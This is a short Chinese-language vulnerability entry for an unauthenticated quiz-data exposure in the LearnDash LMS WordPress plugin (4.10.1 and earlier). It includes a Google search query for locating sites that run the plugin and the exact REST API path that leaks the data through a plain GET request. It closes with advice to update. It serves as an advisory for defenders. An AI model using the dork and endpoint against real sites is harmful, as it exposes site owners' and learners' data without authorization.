**漏洞名称**

WordPress Plugin LearnDash LMS 敏感信息未授权访问漏洞

**漏洞影响**

WordPress Plugin LearnDash LMS <= 4.10.1

**漏洞描述**



WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。

WordPress Plugin LearnDash LMS 4.10.1及之前版本存在安全漏洞，该漏洞源于容易通过API暴露敏感信息，未经身份验证的攻击者可能获得测验的访问权限。

**google搜索语句**

```
inurl:"/wp-content/plugins/sfwd-lms"
```

**漏洞复现**

路径

```
/wp-json/ldlms/v1/sfwd-quiz
```

get请求可以使用浏览器访问

漏洞复现成功

**修复建议**

建议您更新当前系统或软件至最新版，完成漏洞的修复。